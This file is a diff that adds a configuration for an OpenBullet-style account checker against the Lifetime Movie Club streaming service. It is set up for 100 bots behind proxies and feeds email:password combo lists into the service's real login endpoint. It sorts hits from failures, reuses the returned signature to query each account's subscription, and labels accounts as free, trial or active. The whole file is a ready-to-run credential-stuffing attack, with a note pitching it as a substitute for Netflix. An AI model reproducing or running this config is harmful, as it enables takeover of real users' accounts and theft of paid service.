@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Lifetime Movie Club",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-06T02:24:22.5034323+02:00",
+  "AdditionalInfo": "When Netflix isn't an option, use this",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://entitlements.svod.aetnd.com/accounts/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  COOKIE "AETN-Country-Code: US" 
+  COOKIE "Country-Code: US" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.lifetimemovieclub.com/purchase" 
+  HEADER "Origin: https://www.lifetimemovieclub.com" 
+#CHECK_IF_VALID KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email" 
+    KEY "Account Pending Registration" 
+    KEY "code\":403" 
+    KEY "Invalid LoginID" 
+  KEYCHAIN Success OR 
+    KEY "code\":200" 
+#PARSE_UID PARSE "<SOURCE>" LR "d\":\"" "\"" Recursive=FALSE -> VAR "UID" "" "" 
+#PARSE_TIMESTAMP PARSE "<SOURCE>" LR "signature_timestamp\":\"" "\"" Recursive=FALSE -> VAR "TIMESTAMP" "" "" 
+#PARSE_SIGNATURE PARSE "<SOURCE>" LR "signature\":\"" "\"" Recursive=FALSE -> VAR "SIG" "" "" 
+#GET_SUBSCRIPTION_INFO REQUEST GET "https://entitlements.svod.aetnd.com/users/subscriptions/1" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-signature: AETN uid=<UID>; signature_timestamp=<TIMESTAMP>; signature=<SIG>;" 
+#CHECK_IF_FREE_OR_PENDING KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "code\":403" 
+    KEY "Account Pending Registration" 
+    KEY "Invalid LoginID" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "Subscription not found" 
+#CAPTURE_SUB_ACTIVE PARSE "<SOURCE>" LR "ve\":" "," Recursive=FALSE -> CAP "Sub Active" "" "" 
+#CAPTURE_TRIAL PARSE "<SOURCE>" LR "od\":" "," Recursive=FALSE -> CAP "Trial" "" "" 
